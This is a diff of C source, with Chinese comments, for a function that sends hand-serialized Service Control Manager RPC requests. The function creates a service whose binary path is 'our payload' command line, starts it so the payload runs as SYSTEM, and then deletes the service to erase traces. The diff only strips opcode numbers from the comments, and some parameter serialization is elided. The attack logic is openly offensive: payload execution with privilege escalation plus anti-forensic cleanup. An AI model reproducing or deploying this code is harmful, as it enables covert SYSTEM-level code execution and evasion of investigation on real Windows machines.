@@ -363,19 +363,19 @@ int InvokeCreateSvcRpcMain(char* pExecCmd)
         return 1;
 
     //-------------------------------------------------------------------------
-    // Step 2: ROpenSCManagerW (Opnum 27) - 获取 SCM 句柄
+    // Step 2: ROpenSCManagerW - 获取 SCM 句柄
     //-------------------------------------------------------------------------
     RpcInitialiseRequestData(&RpcConnection);
     RpcAppendRequestData_Dword(&RpcConnection, 0);                    // lpMachineName = NULL
     RpcAppendRequestData_Dword(&RpcConnection, 0);                    // lpDatabaseName = NULL  
     RpcAppendRequestData_Dword(&RpcConnection, SC_MANAGER_ALL_ACCESS); // dwDesiredAccess
-    RpcSendRequest(&RpcConnection, RPC_CMD_ID_OPEN_SC_MANAGER);       // Opnum 27
+    RpcSendRequest(&RpcConnection, RPC_CMD_ID_OPEN_SC_MANAGER);       
     
     // 响应前20字节是 SCM 句柄，后4字节是返回值
     memcpy(bServiceManagerObject, &RpcConnection.bProcedureOutputData[0], 20);
 
     //-------------------------------------------------------------------------
-    // Step 3: RCreateServiceW (Opnum 24) - 创建服务
+    // Step 3: RCreateServiceW - 创建服务
     // 这里手工序列化了 CreateService 的所有参数
     //-------------------------------------------------------------------------
     RpcInitialiseRequestData(&RpcConnection);
@@ -392,30 +392,30 @@ int InvokeCreateSvcRpcMain(char* pExecCmd)
     // ... lpBinaryPathName (我们的 payload 命令行) ...
     RpcAppendRequestData_Binary(&RpcConnection, (BYTE*)szServiceCommandLine, dwServiceCommandLineLength);
     // ... 其他参数 (LoadOrderGroup, Dependencies 等都设为 NULL) ...
-    RpcSendRequest(&RpcConnection, RPC_CMD_ID_CREATE_SERVICE);  // Opnum 24
+    RpcSendRequest(&RpcConnection, RPC_CMD_ID_CREATE_SERVICE);  
 
     // 响应: [0-3] TagId, [4-23] 服务句柄, [24-27] 返回值
     memcpy(bServiceObject, &RpcConnection.bProcedureOutputData[4], 20);
 
     //-------------------------------------------------------------------------
-    // Step 4: RStartServiceW (Opnum 31) - 启动服务
+    // Step 4: RStartServiceW - 启动服务
     // 服务会以 SYSTEM 身份运行，执行我们的 payload
     //-------------------------------------------------------------------------
     RpcInitialiseRequestData(&RpcConnection);
     RpcAppendRequestData_Binary(&RpcConnection, bServiceObject, 20);  // hService
     RpcAppendRequestData_Dword(&RpcConnection, 0);                    // argc = 0
     RpcAppendRequestData_Dword(&RpcConnection, 0);                    // argv = NULL
-    RpcSendRequest(&RpcConnection, RPC_CMD_ID_START_SERVICE);         // Opnum 31
+    RpcSendRequest(&RpcConnection, RPC_CMD_ID_START_SERVICE);         
     
     // 注意: 返回 ERROR_SERVICE_REQUEST_TIMEOUT (1053) 是正常的
     // 因为我们的 "服务" 不是真正的服务程序，不会响应 SCM 的控制请求
 
     //-------------------------------------------------------------------------
-    // Step 5: RDeleteService (Opnum 2) - 删除服务，清理痕迹
+    // Step 5: RDeleteService - 删除服务，清理痕迹
     //-------------------------------------------------------------------------
     RpcInitialiseRequestData(&RpcConnection);
     RpcAppendRequestData_Binary(&RpcConnection, bServiceObject, 20);
-    RpcSendRequest(&RpcConnection, RPC_CMD_ID_DELETE_SERVICE);  // Opnum 2
+    RpcSendRequest(&RpcConnection, RPC_CMD_ID_DELETE_SERVICE);  
 
     RpcDisconnect(&RpcConnection);
     return 0;
